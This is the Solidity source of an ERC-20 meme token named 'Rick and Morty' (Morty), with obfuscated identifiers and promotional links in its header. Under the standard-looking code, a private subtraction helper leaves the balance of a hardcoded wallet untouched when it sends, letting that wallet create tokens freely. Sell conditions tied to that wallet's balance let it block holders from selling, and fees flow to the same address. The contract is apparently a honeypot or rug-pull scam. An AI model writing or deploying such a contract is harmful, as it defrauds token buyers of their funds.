//https://twitter.com/elonmusk/status/1710194347759525950

//https://t.me/Morty_erc


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _enqro(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _enqro(a, b, "SafeMath");
    }

    function  _enqro(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract lol is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _Tvnrgek;
    address payable private _yqicjep;
    address private _rjvclu;

    string private constant _name = unicode"Rick and Morty";
    string private constant _symbol = unicode"Morty";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _acylhsr;
    mapping (address => bool) private _yrbihy;
    mapping(address => uint256) private _fnjqxp;
    uint256 public _qvalbid = _totalSupply;
    uint256 public _eorpvie = _totalSupply;
    uint256 public _rkTjkur= _totalSupply;
    uint256 public _vadTetf= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ykuvqj=0;
    uint256 private _ekjursg=0;
    

    bool private _bvwarh;
    bool public _ureozbf = false;
    bool private pvabkye = false;
    bool private _orugzvu = false;


    event _hrqwcyt(uint _qvalbid);
    modifier uevgjlr {
        pvabkye = true;
        _;
        pvabkye = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _acylhsr[owner(

        )] = true;
        _acylhsr[address
        (this)] = true;
        _acylhsr[
            _yqicjep] = true;
        _yqicjep = 
        payable (0x861DCeFCE83182AC4b037EBbDCA5A974653fF1F5);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _enqro(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 vcjdkr=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_ureozbf) {
                if (to 
                != address
                (_Tvnrgek) 
                && to !=
                 address
                 (_rjvclu)) {
                  require(_fnjqxp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnjqxp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rjvclu && to != 
            address(_Tvnrgek) &&
             !_acylhsr[to] ) {
                require(amount 
                <= _qvalbid,
                 "Exceeds the _qvalbid.");
                require(balanceOf
                (to) + amount
                 <= _eorpvie,
                  "Exceeds the _eorpvie.");
                if(_ekjursg
                < _ykuvqj){
                  require
                  (! _rkyiezq(to));
                }
                _ekjursg++;
                 _yrbihy
                 [to]=true;
                vcjdkr = amount._pvr
                ((_ekjursg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rjvclu &&
             from!= address(this) 
            && !_acylhsr[from] ){
                require(amount <= 
                _qvalbid && 
                balanceOf(_yqicjep)
                <_vadTetf,
                 "Exceeds the _qvalbid.");
                vcjdkr = amount._pvr((_ekjursg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_ekjursg>
                _ykuvqj &&
                 _yrbihy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!pvabkye 
            && to == _rjvclu &&
             _orugzvu &&
             contractTokenBalance>
             _rkTjkur 
            && _ekjursg>
            _ykuvqj&&
             !_acylhsr[to]&&
              !_acylhsr[from]
            ) {
                _transferFrom( _wrelf(amount, 
                _wrelf(contractTokenBalance,
                _vadTetf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _piwxeo(address
                    (this).balance);
                }
            }
        }

        if(vcjdkr>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(vcjdkr);
          emit
           Transfer(from,
           address
           (this),vcjdkr);
        }
        _balances[from
        ]= _enqro(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _enqro(vcjdkr));
        emit Transfer
        (from, to, 
        amount.
         _enqro(vcjdkr));
    }

    function _transferFrom(uint256
     tokenAmount) private
      uevgjlr {
        if(tokenAmount==
        0){return;}
        if(!_bvwarh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tvnrgek.WETH();
        _approve(address(this),
         address(
             _Tvnrgek), 
             tokenAmount);
        _Tvnrgek.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wrelf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _enqro(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _yqicjep){
            return a ;
        }else{
            return a .
             _enqro (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvalbid = _totalSupply;
        _eorpvie = _totalSupply;
        emit _hrqwcyt(_totalSupply);
    }

    function _rkyiezq(address 
    account) private view 
    returns (bool) {
        uint256 ehjojv;
        assembly {
            ehjojv :=
             extcodesize
             (account)
        }
        return ehjojv > 
        0;
    }

    function _piwxeo(uint256
    amount) private {
        _yqicjep.
        transfer(
            amount);
    }

    function openrTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bvwarh ) ;
        _Tvnrgek  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tvnrgek), 
            _totalSupply);
        _rjvclu = 
        IUniswapV2Factory(_Tvnrgek.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tvnrgek .
             WETH ( ) );
        _Tvnrgek.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rjvclu).
        approve(address(_Tvnrgek), 
        type(uint)
        .max);
        _orugzvu = true;
        _bvwarh = true;
    }

    receive() external payable {}
}